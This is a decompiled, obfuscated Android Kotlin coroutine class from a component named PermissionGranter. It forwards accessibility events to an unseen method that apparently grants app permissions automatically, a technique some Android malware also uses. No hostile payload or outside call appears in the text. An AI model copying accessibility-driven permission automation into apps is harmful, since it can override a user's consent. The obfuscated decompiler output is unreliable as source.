package com.storm.safe.rock.manager;

import android.view.accessibility.AccessibilityNodeInfo;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.PermissionGranter$handleAccessibilityEvent$1", m214403f = "PermissionGranter.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PermissionGranter$handleAccessibilityEvent$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0260a2 f52011a1;

    /* renamed from: a2 */
    public final /* synthetic */ AccessibilityNodeInfo f52012a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f52013a3;

    /* renamed from: a4 */
    public final /* synthetic */ int f52014a4;

    /* renamed from: a5 */
    public final /* synthetic */ String f52015a5;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PermissionGranter$handleAccessibilityEvent$1(C0260a2 c0260a2, AccessibilityNodeInfo accessibilityNodeInfo, String str, int i, String str2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52011a1 = c0260a2;
        this.f52012a2 = accessibilityNodeInfo;
        this.f52013a3 = str;
        this.f52014a4 = i;
        this.f52015a5 = str2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PermissionGranter$handleAccessibilityEvent$1(this.f52011a1, this.f52012a2, this.f52013a3, this.f52014a4, this.f52015a5, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        PermissionGranter$handleAccessibilityEvent$1 permissionGranter$handleAccessibilityEvent$1 = (PermissionGranter$handleAccessibilityEvent$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        permissionGranter$handleAccessibilityEvent$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C1351vv c1351vv = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            if (!this.f52011a1.f52111a3) {
                C0260a2.m211258a1(this.f52011a1, this.f52013a3, this.f52014a4, this.f52012a2);
                return c1351vv;
            }
            AccessibilityNodeInfo accessibilityNodeInfo = this.f52012a2;
            if (accessibilityNodeInfo == null) {
                return c1351vv;
            }
            accessibilityNodeInfo.recycle();
            return c1351vv;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 处理无障碍事件失败", e);
            return c1351vv;
        }
    }
}
